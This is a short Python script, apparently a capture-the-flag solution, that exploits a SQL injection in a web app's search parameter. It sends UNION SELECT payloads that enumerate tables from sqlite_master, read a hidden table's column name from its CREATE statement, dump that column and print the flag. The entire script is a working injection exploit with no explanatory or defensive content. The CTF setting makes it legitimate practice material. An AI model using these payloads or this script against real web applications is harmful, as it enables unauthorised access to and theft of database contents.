import re, urllib.parse
from helper import get_raw

def inject(term):
    return get_raw("/search?q=" + urllib.parse.quote(term))

# 1) enumerate user tables from sqlite_master
listing = inject("zzz%' UNION SELECT name, sql FROM sqlite_master "
                 "WHERE type='table' -- ")
tables = dict(re.findall(r"^(\S+) - (.*)$", listing, re.M))
secret = next(t for t in tables if t not in ("products", "users"))

# 2) first column name of the secret table (from its CREATE statement)
col = re.search(r"\((\w+)", tables[secret]).group(1)

# 3) exfiltrate
dump = inject(f"zzz%' UNION SELECT {col}, {col} FROM {secret} -- ")
print(re.search(r"FLAG\{[a-z0-9_]+\}", dump).group(0))
